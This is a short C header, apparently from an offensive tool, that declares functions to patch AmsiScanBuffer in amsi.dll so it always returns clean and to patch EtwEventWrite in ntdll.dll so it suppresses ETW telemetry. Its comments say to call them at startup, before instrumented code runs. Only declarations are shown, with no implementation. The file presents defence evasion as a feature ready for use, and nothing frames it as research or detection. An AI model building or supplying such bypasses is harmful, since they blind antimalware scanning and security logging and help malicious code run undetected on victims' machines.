/*
 * bypass.h — AMSI and ETW in-process patches
 * Must be called once at startup, before any AMSI/ETW-instrumented code runs.
 */
#pragma once
#include <windows.h>

/*
 * bypass_amsi — patch AmsiScanBuffer in amsi.dll to always return clean.
 * Safe to call if amsi.dll is not loaded (no-op).
 */
BOOL bypass_amsi(void);

/*
 * bypass_etw — patch EtwEventWrite in ntdll.dll to return immediately.
 * Suppresses ETW-based telemetry in the current process.
 */
BOOL bypass_etw(void);
